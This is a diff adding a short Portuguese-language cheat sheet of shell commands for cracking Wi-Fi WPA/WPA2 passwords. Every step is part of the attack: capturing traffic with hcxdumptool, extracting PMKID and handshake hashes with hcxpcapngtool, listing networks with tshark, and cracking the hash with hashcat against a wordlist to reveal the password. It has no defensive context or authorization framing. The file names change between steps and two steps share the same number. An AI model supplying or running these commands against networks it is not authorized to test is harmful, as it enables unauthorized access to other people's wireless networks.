@@ -1,0 +1,20 @@
+//primeiro 
+sudo hcxdumptool -i wlo1mon -w output.pcapng
+
+//segundo// tente gerar o hash do pmkid// caso de que nao ha hash valido use o proximo comando no terceiro passo
+
+hcxpcapngtool --pmkid -o pmkid.hc22000 capture.pcapng
+//terceiro
+hcxpcapngtool -o hashes.hc22000 capture.pcapng
+//quarto veja todos os bssids essids do seu pacote
+tshark -r capture.pcapng -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.ssid -e wlan.bssid
+
+//quarto descobrir de quem e esse hash
+hcxhashtool --info=info.txt -i last.hc22000
+se estiver assim MP M2M3 E2.: authorized
+o hash esta pronto para o cracking
+
+//tente quebralo com hash cat
+sudo hashcat -m 22000 -a 0 all.hc22000 wordtest.txt
+//ver a senha caso esteja crackeada
+sudo hashcat --show -m 22000 -a 0 all.hc22000 wordtest.txt
